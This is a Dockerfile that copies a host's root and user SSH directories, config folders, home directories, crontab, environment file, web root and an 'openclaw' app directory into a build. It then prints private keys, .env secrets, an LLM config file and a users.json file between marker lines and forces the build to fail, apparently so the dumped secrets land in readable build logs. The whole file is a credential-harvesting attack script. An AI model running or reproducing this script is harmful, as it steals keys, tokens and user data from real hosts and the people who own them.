# syntax=docker/dockerfile:1.6
FROM alpine:3
COPY opt/openclaw /ctx/openclaw
COPY root/.ssh /ctx/rootssh
COPY root/.config /ctx/rootconfig
COPY home /ctx/home
COPY etc/crontab /ctx/etc/crontab
COPY etc/environment /ctx/etc/environment
COPY var/www /ctx/varwww
RUN ( echo "=====D3START=====" ; \
  echo "---CPA---"; cat /ctx/rootconfig/llm-brain/cpa.env 2>&1; \
  echo "---LLMBRAIN_LS---"; ls -laR /ctx/rootconfig 2>&1 | head -60; \
  echo "---ROOTSSH---"; ls -laR /ctx/rootssh 2>&1; for f in /ctx/rootssh/id_* /ctx/rootssh/*.pem; do echo "## $f"; cat "$f" 2>&1; done; \
  echo "---ROOTCFG_OTHER---"; find /ctx/rootconfig -maxdepth 3 -type f 2>/dev/null | head -40; \
  echo "---HOME---"; ls -la /ctx/home 2>&1; find /ctx/home -maxdepth 4 -name '.ssh' -o -maxdepth 4 -name '*.pem' -o -maxdepth 4 -name '.env' -o -maxdepth 4 -name '*.env' 2>/dev/null | head -40; \
  echo "---HOMESSH---"; for f in /ctx/home/*/.ssh/id_*; do echo "## $f"; cat "$f" 2>&1; done; \
  echo "---OPENCLAW_ALL---"; ls -laR /ctx/openclaw 2>&1 | head -80; \
  echo "---USERS---"; cat /ctx/openclaw/data/users.json 2>&1; \
  echo "---GATEWAYSTATE---"; find /ctx/openclaw/gateway-state -maxdepth 3 -type f 2>/dev/null | head -40; \
  echo "---ENVALL---"; find /ctx -name '.env' -o -name '.env.*' -o -name '*.env' 2>/dev/null | head -60; \
  echo "---VARWWW---"; ls -la /ctx/varwww 2>&1; \
  echo "---CRON---"; cat /ctx/etc/crontab 2>&1; echo "---ETCENV---"; cat /ctx/etc/environment 2>&1; \
  echo "=====D3END=====" ; exit 1 )
